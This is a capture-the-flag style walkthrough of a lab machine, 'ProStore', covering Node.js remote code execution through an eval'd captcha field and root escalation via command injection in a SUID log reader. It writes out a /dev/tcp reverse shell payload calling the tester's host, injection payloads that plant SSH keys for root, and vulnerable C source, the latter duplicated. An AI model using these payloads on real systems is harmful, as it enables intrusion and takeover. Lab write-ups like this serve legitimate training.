ProStore

Target IP: 192.168.109.250
Challenge Description: N/A.

Reconnaissance


Running a TCP port scan using the command sudo nmap -sS 192.168.109.250 -p- returns the result shown in the image above. There are two TCP ports open on the target machine. SSH is open on port 22, and some other application on port 5000.


Performing an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.109.250 -p 22,5000 returns the result shown in the image above. SSH application OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 is running on port 22. And Node.js web application is running on port 5000.

Enumeration

Port 5000: HTTP

The webpage shown in the picture above is returned for this web application. This is a web store. I notice there are multiple buttons on the webpage: Products, Login, and Register. Pressing the last two buttons redirects me to /auth/.


I pressed the Register button. And I can create an account. Time to create a test account. I created an account with the credentials test:123. Time to enumerate further.


Right away, I notice the web application has a cart feature. This allows users to add items to their cart to checkout. I added two items in my cart and pressed the Orders button to checkout my cart, as shown in the image above.


After pressing the Go To Checkout button from the previous image, the webpage shown in the picture above is returned. I find this page interesting as it informs me to enter my details. These parameters could be enumerated further. Since the web application is built using Node JS, it could potentially be vulnerable to SSTI, code execution, etc. Since this could be a POST request to the server, I fired up burpsuite on my machine to intercept the request.


After intercepting the request using burpsuite, I obtained the result shown in the image above. The web application is using JWT by the looks of it. I decoded the JWT token and received the data "iat": 1736031869 as a key-value pair. I find two more things interesting. After filling in the form and pressing the CONTINUE button from the previous image, the webpage shown in the image above via the intercepted request is returned. It mentions the order is successful and it's on the way. Right underneath it, the Full name: t is also returned. Is this application vulnerable to Server-Side Template Injection? After some enumeration for SSTI, I didn't find anything. The parameters, full_name=t&address=t&card=t&cvc=1&date=1221&captcha=3, are still yet to be enumerated.


When enumerating the captcha parameter, I input the wrong number 123 and obtained the webpage shown in the image above. The message Captcha error! is returned to me. Since the captcha is a basic question (8-?=5), what happens if I input different data-type such as string?


And bingo. I sent the string gtfo as the captcha answer and obtained the error message shown in the image above. The message ReferenceError: gtfo is not defined is an exception thrown in the JavaScript language when the variable doesn't exist in the current referenced scope; more information is available here about this exception. In simple terms, the web application is trying to grab the value of gtfo which has not been initialised. I reset the box and it has the IP of 192.168.227.250.

Exploitation

Owning the Node JS Web Application via RCE


The captcha is likely being evaluated by the eval function; therefore, it is possible to pass a malicious code to obtain remote code execution. This attack is explained further here. I started a listener on my machine at port 80. Then I deployed the reverse shell payload require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/192.168.45.206/80+0>%261"'). And sending the request, I instantly obtained a reverse shell connection to my machine at port 80 as shown in the picture above. Now I have a foothold on the target machine as the user observer. Since the access is unstable, I will obtain a stable foothold.


I generated a new SSH keypair using the command ssh-keygen on my machine. The filename I saved it as is observer. Then I created a new .ssh directory using the command mkdir .ssh inside the home directory of user observer. Afterwards, I used the command echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAL8REo3hJ8SwgxHI85PeFGp2TzbyBxy09XWmm1C7/5C kali@kali' > authorized_keys to insert my new SSH keypair inside the authorized_keys of user observer. The permission of the key is also changed using the command chmod 400 observer.


To connect to the target machine using the new SSH key, I ran the command ssh observer@192.168.227.250 -i observer. As shown in the image above, now I have a stable SSH foothold on the target machine as the user observer.

Privilege Escalation

Vertical Privilege Escalation: User observer to User root via Command Injection Inside log_reader

Running the command find / -perm -u=s -type f 2>/dev/null returns the result shown in the image above. There is an interesting & unusual entry by the name /usr/local/bin/log_reader which has SUID bit set. Can this binary be used to read log files? This user does not belong to the adm group -- a group privilege that can be abused to read log files such as /var/www/auth.log. Time to check what this binary can do. I ran the command log_reader and obtained the following Usage: log_reader filename.log. I can just pass the log file I wish to read after invoking the binary.


To obtain more information on how the log_reader works, I ran strings on it. But I didn't obtain anything useful. I also attempted to transfer this file to my machine to perform further analysis, but I had no luck. When checking what applications are currently installed on the machine using the command dpkg -l, I noticed gdb is installed. I can use this to analyse the binary.


I ran the command gdb log_reader to start debugging. Then I used the command list. However, the output states /tmp/log_reader.c: No such file or directory.. When checking the /tmp directory, I could not find the log_reader.c file. Using the command find / -name "log_reader.c" 2>/dev/null, I found the file at /usr/share/src/. Now I have access to the source code of the binary.


Running cat /usr/share/src/log_reader.c returns the output shown in the image above. The source code is self-explanatory. However, I find the following interesting:

void checkExtention(char *filename, char *result) {
    char *ext = strchr(filename, '.');

    if (ext != NULL) {
        result = strstr(ext, ".log");
    }
}

void readFile(char *filename) {
    setuid(0);
    setgid(0);

    printf("Reading: %s\n", filename);

    char command[200] = "/usr/bin/cat ";
    char output[10000];
    FILE *result;

    strcat(command, filename);
    result = popen(command, "r");
    fgets(output, sizeof(output), result);
    printf("%s\n", output);
}
void checkExtention(char *filename, char *result) {
    char *ext = strchr(filename, '.');

    if (ext != NULL) {
        result = strstr(ext, ".log");
    }
}

void readFile(char *filename) {
    setuid(0);
    setgid(0);

    printf("Reading: %s\n", filename);

    char command[200] = "/usr/bin/cat ";
    char output[10000];
    FILE *result;

    strcat(command, filename);
    result = popen(command, "r");
    fgets(output, sizeof(output), result);
    printf("%s\n", output);
}

The function checkExtension(char *, char *) is interesting. No sort of file extension check is performed. Instead, it just checks if the file name contains .. If not, it will automatically append the .log as the extension. The function readFile(char *) is also interesting. The binary /usr/bin/cat is executed using absolute path to read the input log file. The C function strcat is used to concatenate the command and file name strings together, and this output is saved to the variable command. This is where the command injection comes in the next line result = popen(command, "r");. The function popen is used to execute the command as a shell command. This is explained more here. Also, this binary is executed as root.


I browsed to /tmp first. Then I ran the command log_reader '/var/log/auth.log&&touch test.txt'. I passed in a real log file /var/log/auth.log to perform command injection. The malicious payload is &&touch test.txt. This is successful as shown in the image above. This command creates a new file called test.txt with root privileges. Now I can insert my own SSH key to obtain root privileges.


On my machine, I ran the command ssh-keygen and saved the file name as root as shown in the image above. The content of root.pub is shown above too. Then I changed the permission of this key using the command chmod 400 root.


Using the command log_reader '/var/log/auth.log&&echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFgaaS7HPC9zMiEiwqjep2ehcp8IbTmtzHxurCbsX9uy kali@kali" > /root/.ssh/authorized_keys', I replaced the authorized_keys of user root, as shown in the picture above on the top terminal. Then I connected to the target machine using the command ssh root@192.168.227.250 -i root. Now I have a root shell access on the target machine as shown in the picture above on the bottom terminal.
